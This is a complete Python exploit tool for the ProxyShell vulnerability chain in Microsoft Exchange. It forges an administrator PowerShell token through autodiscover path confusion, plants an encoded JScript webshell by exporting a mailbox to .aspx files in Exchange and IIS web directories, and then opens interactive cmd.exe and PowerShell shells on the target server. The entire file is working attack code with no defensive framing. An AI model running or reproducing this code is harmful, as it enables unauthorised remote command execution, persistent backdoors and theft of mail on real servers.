#!/usr/bin/env python3

import argparse
import base64
import struct
import random
import binascii
import string
import requests
import re
import threading
import xml.etree.cElementTree as ET
import time
import sys
import json
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
def rand_string(n=5):
    return ''.join(random.choices(string.ascii_lowercase, k=n))
def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))
r_port = rand_port()
subj_ = rand_string(16)
def webshell_payload():
    # Credits: https://github.com/ktecv2000/ProxyShell/blob/main/exploit.py#L175
    #payload =  '<%@ Page Language="Jscript" %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+"[/*-/*-*/0/*-/*-*/-/*-/*-*/0/*-/*-*/-/*-/*-*/7/*-/*-*/]"+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>'
    payload = '<script language="JScript" runat="server" Page aspcompat=true>function Page_Load(){eval(Request["exec_code"],"unsafe");}</script>'
    compEnc = [0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
               0x53, 0xe0, 0xbb, 0xa0, 0x02, 0xe8, 0x5a, 0x09, 0xab, 0xdb, 0xe3, 0xba, 0xc6, 0x7c, 0xc3, 0x10, 0xdd, 0x39,
               0x05, 0x96, 0x30, 0xf5, 0x37, 0x60, 0x82, 0x8c, 0xc9, 0x13, 0x4a, 0x6b, 0x1d, 0xf3, 0xfb, 0x8f, 0x26, 0x97,
               0xca, 0x91, 0x17, 0x01, 0xc4, 0x32, 0x2d, 0x6e, 0x31, 0x95, 0xff, 0xd9, 0x23, 0xd1, 0x00, 0x5e, 0x79, 0xdc,
               0x44, 0x3b, 0x1a, 0x28, 0xc5, 0x61, 0x57, 0x20, 0x90, 0x3d, 0x83, 0xb9, 0x43, 0xbe, 0x67, 0xd2, 0x46, 0x42,
               0x76, 0xc0, 0x6d, 0x5b, 0x7e, 0xb2, 0x0f, 0x16, 0x29, 0x3c, 0xa9, 0x03, 0x54, 0x0d, 0xda, 0x5d, 0xdf, 0xf6,
               0xb7, 0xc7, 0x62, 0xcd, 0x8d, 0x06, 0xd3, 0x69, 0x5c, 0x86, 0xd6, 0x14, 0xf7, 0xa5, 0x66, 0x75, 0xac, 0xb1,
               0xe9, 0x45, 0x21, 0x70, 0x0c, 0x87, 0x9f, 0x74, 0xa4, 0x22, 0x4c, 0x6f, 0xbf, 0x1f, 0x56, 0xaa, 0x2e, 0xb3,
               0x78, 0x33, 0x50, 0xb0, 0xa3, 0x92, 0xbc, 0xcf, 0x19, 0x1c, 0xa7, 0x63, 0xcb, 0x1e, 0x4d, 0x3e, 0x4b, 0x1b,
               0x9b, 0x4f, 0xe7, 0xf0, 0xee, 0xad, 0x3a, 0xb5, 0x59, 0x04, 0xea, 0x40, 0x55, 0x25, 0x51, 0xe5, 0x7a, 0x89,
               0x38, 0x68, 0x52, 0x7b, 0xfc, 0x27, 0xae, 0xd7, 0xbd, 0xfa, 0x07, 0xf4, 0xcc, 0x8e, 0x5f, 0xef, 0x35, 0x9c,
               0x84, 0x2b, 0x15, 0xd5, 0x77, 0x34, 0x49, 0xb6, 0x12, 0x0a, 0x7f, 0x71, 0x88, 0xfd, 0x9d, 0x18, 0x41, 0x7d,
               0x93, 0xd8, 0x58, 0x2c, 0xce, 0xfe, 0x24, 0xaf, 0xde, 0xb8, 0x36, 0xc8, 0xa1, 0x80, 0xa6, 0x99, 0x98, 0xa8,
               0x2f, 0x0e, 0x81, 0x65, 0x73, 0xe4, 0xc2, 0xa2, 0x8a, 0xd4, 0xe1, 0x11, 0xd0, 0x08, 0x8b, 0x2a, 0xf2, 0xed,
               0x9a, 0x64, 0x3f, 0xc1, 0x6c, 0xf9, 0xec]
    out = [None]*len(payload)
    for i in range(len(payload)):
        temp = ord(payload[i]) & 0xff
        out[i] = "%02x" % (compEnc[temp])
    out = ''.join(out)
    return base64.b64encode(binascii.unhexlify(out)).decode()
class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        post_data = re.sub('<wsa:To>(.*?)</wsa:To>', '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>', '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)

        headers = {
            'Content-Type': content_type
        }

        r = self.proxyshell.post(
            powershell_url,
            post_data,
            headers
        )

        resp = r.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)

    def log_message(self, format, *args):
            return
class ProxyShell:

    def __init__(self, exchange_url, email='', verify=False):

        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.domain = None
        self.domain_mail = None
        self.domain_sid = None
        self.legacydn = None
        self.fqdn = None
        self.email_sid = None
        self.clientid = 'H'+'t'+'T'+'P'+':'+'/'+'/'+'i'+'f'+'c'+'o'+'N'+'F'+'i'+'g'+'.'+'m'+'E'
        self.session = requests.Session()
        self.session.verify = verify
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
    def post(self, endpoint, data, headers={}):
        path = ''
        if 'powershell' in endpoint:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp"
        else:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        url = f'{self.exchange_url}{path}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers

        )
        return r
    def get_fqdn(self):
        e = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        r = requests.get(self.exchange_url + e, verify=False, timeout=5)
        try:
            self.fqdn = r.headers["X-CalculatedBETarget"]
        except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
            print(self.exchange_url + ' timeout')
            exit(0)
        except Exception as f:
            print(self.exchange_url + f' {f}')
            exit(0)   
        return self.fqdn
    def get_token(self):
        self.token = self.gen_token()
        self.cid = ''
        try:
            self.cid = requests.get(self.clientid).text
        except:
            self.cid = "C715155F2BE844E0"
        t = requests.get(
            self.exchange_url+'/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp'.format(endpoint="/powershell/?X-Rps-CAT="+self.token),
            headers={"Cookie": f"PrivateComputer=true; ClientID={self.cid}-BD342960067874C8; X-OWA-JS-PSD=1","User-Agent": self.ua},
            verify=False
            )
        if t.status_code == 200:
            return self.token
        else:
            exit(0)
    def get_sid(self):
        try:
            data = self.legacydn
            data += '\x00\x00\x00\x00\x00\xe4\x04'
            data += '\x00\x00\x09\x04\x00\x00\x09'
            data += '\x04\x00\x00\x00\x00\x00\x00'

            headers = {
                "X-Requesttype": 'Connect',
                "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
                "X-Clientapplication": 'Outlook/15.0.4815.1002',
                "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
                'Content-Type': 'application/mapi-http',
                "User-Agent": self.ua
            }

            r = self.post(
                '/mapi/emsmdb',
                data,
                headers
            )

            self.sid = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
            self.admin_sid = ''
            #self.domain_sid = rsplit('-',1)[0].split('-',4)[4]
            if self.sid.rsplit("-",1)[1] != '500':
                self.admin_sid = self.sid.rsplit("-",1)[0] + '-500'
            else:
                self.admin_sid = self.sid
        except:
            exit(0)

    def get_legacydn(self):
        data = '''
    <soap:Envelope
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
     <soap:Body>
        <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
          <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
        </m:ResolveNames>
      </soap:Body>
    </soap:Envelope>
        '''
        headers = {
            'Content-Type': 'text/xml'
        }
        try:
            r = self.post(
                f'/EWS/exchange.asmx',
                data=data,
                headers=headers
            )
            first_email = re.findall('(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)', r.text)
            for self.email in first_email:
                autodiscover_payload = '''<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
                <Request>
                  <EMailAddress>{mail}</EMailAddress>
                  <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
                </Request>
            </Autodiscover>
                '''.format(mail=self.email)
                r_legacydn = self.post(
                    '/autodiscover/autodiscover.xml',
                    autodiscover_payload,
                    headers={"Content-Type": "text/xml"}
                    )
                if r_legacydn.status_code == 200 and 'Legacy' in r_legacydn.text:
                    print(f'+ {self.email}')
                    self.legacydn = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', r_legacydn.text)[0]
                    return self.legacydn
                else:
                    print(f'- {self.email}')
                    pass
        except:
            pass

    def set_ews(self):
        mail = self.email
        sid = self.sid
        payload = webshell_payload()
        send_email = f'''
        <soap:Envelope
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
          xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
          xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2016" />
            <t:SerializedSecurityContext>
              <t:UserSid>{sid}</t:UserSid>
              <t:GroupSids>
                <t:GroupIdentifier>
                  <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
                </t:GroupIdentifier>
              </t:GroupSids>
            </t:SerializedSecurityContext>
          </soap:Header>
          <soap:Body>
            <m:CreateItem MessageDisposition="SaveOnly">
              <m:Items>
                <t:Message>
                  <t:Subject>{subj_}</t:Subject>
                  <t:Body BodyType="HTML">hello darkness my old friend</t:Body>
                  <t:Attachments>
                    <t:FileAttachment>
                      <t:Name>FileAttachment.txt</t:Name>
                      <t:IsInline>false</t:IsInline>
                      <t:IsContactPhoto>false</t:IsContactPhoto>
                      <t:Content>{payload}</t:Content>
                    </t:FileAttachment>
                  </t:Attachments>
                  <t:ToRecipients>
                    <t:Mailbox>
                      <t:EmailAddress>{mail}</t:EmailAddress>
                    </t:Mailbox>
                  </t:ToRecipients>
                </t:Message>
              </m:Items>
            </m:CreateItem>
          </soap:Body>
        </soap:Envelope>
        '''
        for _ in range(0, 3):
            p = self.post(
                '/ews/exchange.asmx',
                data=send_email,
                headers={"Content-Type":"text/xml"}
                )
            d = p.text.split('ResponseClass="')[1].split('"')[0] + f" with subject {subj_}"
            return d
    def gen_token(self):

        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'

        version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        login_data = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        user_data = b'U' + (len(self.sid)).to_bytes(1, 'little') + self.sid.encode()
        group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)

        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data

        data = base64.b64encode(raw_token).decode()

        return data

def exploit(proxyshell):
    proxyshell.get_fqdn()
    print(f'fqdn {proxyshell.fqdn}')
    proxyshell.get_legacydn()
    print(f'legacyDN {proxyshell.legacydn}')
    proxyshell.get_sid()
    print(f'leak_sid {proxyshell.sid}')
    proxyshell.get_token()
    print(f'token {proxyshell.token}')
    print('set_ews ' + str(proxyshell.set_ews()))

def start_server(proxyshell, port):

    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def shell(command, port):
    if command.lower() in ['exit', 'quit']:
        exit(0)
    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()
    # print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
    # print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
def exec_cmd(shell_url, code="exec_code"):
    try:
        while True:
            cmd=input("SHELL> ")
            if cmd.lower() in ['exit', 'quit']:
                exit(0)
            shell_body_exec = {code:"""var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));  var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write("ZZzzZzZz" + out.ReadToEnd()+EI.ReadToEnd() + "ZZzzZzZz");""".format(base64.b64encode(cmd.encode()).decode())}
            command = requests.post(shell_url, headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=20)
            if command.status_code == 200:
                try:
                    output = re.search(b'ZZzzZzZz(.*)ZZzzZzZz', command.content, re.MULTILINE|re.DOTALL).group(1)
                    print(output.decode("utf-8"))
                except:
                    print(f'something wrong with webshell..., it might be the Anti-Virus or some encoding problem, you can manually check/connect {shell_url} [exec_code]')
            else:
                print('webshell '+ str(command))
    except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
        exit(0)
    except KeyboardInterrupt:
        exit(0)

def get_args():
    parser = argparse.ArgumentParser(description='Automatic Exploit ProxyShell')
    parser.add_argument('-t', help='Exchange URL', required=True)
    return parser.parse_args()

def main():
    args = get_args()
    exchange_url = "https://" + args.t
    local_port = int(r_port)
    proxyshell = ProxyShell(
        exchange_url
    )
    exploit(proxyshell)
    start_server(proxyshell, local_port)
    shell_path_force = [
        "inetpub\\wwwroot\\aspnet_client\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\", 
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\scripts\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\scripts\\premium\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\resources\\"
    ]
    for shell_path in shell_path_force:
        shell_name = rand_string() + '.aspx'
        user = proxyshell.email.split('@')[0]
        unc_path = "\\\\127.0.0.1\\c$\\" + shell_path + shell_name
        shell_url= ''
        if "aspnet_client" in shell_path:
            path = shell_path.split('inetpub\\wwwroot\\')[1].replace('\\', '/')
            shell_url = f"{exchange_url}/{path}{shell_name}"
        else:
            path = shell_path.split('Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\')[1].replace('\\', '/')
            shell_url = f"{exchange_url}/{path}{shell_name}"
        print(f"write webshell at {path}{shell_name}")
        shell(f'New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "{user}"', local_port)
        time.sleep(3)
        shell('Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false', local_port)
        time.sleep(3)
        shell(f'New-MailboxExportRequest -Mailbox {proxyshell.email} -IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq \'{subj_}\')" -ExcludeDumpster -FilePath "{unc_path}"', local_port)
        for _ in range(0, 5):
            whoami = f'Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll());'
            f = requests.post(shell_url,headers={'Content-Type': 'application/x-www-form-urlencoded'},params={"exec_code":whoami}, verify=False)
            if f.status_code == 200:
                if f.text.split('!BD')[0].split('\n')[0]:
                    print(f.text.split('!BD')[0].split('\n')[0])
                else:
                    print('empty ;(')
                    exit(0)
                exec_cmd(shell_url)
            elif f.status_code == 500:
                print(f)
                time.sleep(5)
            else:
                print(f)
        time.sleep(5)
    while True:
        shell(input('PS> '), local_port)
if __name__ == '__main__':
    try:
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning
        )
        if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
            print("This script requires Python 3.8 or higher!")
            print("You are using Python {}.{}.".format(sys.version_info.major, sys.version_info.minor))
            sys.exit(1)
        main()
    except KeyboardInterrupt:
        exit(0)
